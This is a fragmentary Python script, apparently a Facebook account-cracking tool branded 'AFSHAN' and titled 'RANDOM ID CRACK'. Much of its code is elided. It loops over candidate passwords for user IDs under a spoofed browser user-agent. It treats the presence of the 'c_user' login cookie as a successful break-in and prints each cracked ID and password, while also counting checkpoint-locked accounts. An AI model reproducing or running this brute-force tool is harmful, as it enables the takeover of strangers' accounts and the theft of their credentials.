...
{R}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{w}
TOOL OWNER    {r}:{w} AFSHAN
TOOL TYPE     {r}:{w} RANDOM ID CRACK {r}[{g}V1.0{r}]
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mAFSHAN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
    ...
    'user-agent': 'Mozilla/5.0 (Wayland like X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6784.66 Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[AFSHAN-OK💉] {uid} | {ps}")
        ...
        sys.stdout.write(f'\r\033[m[AFSHAN🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
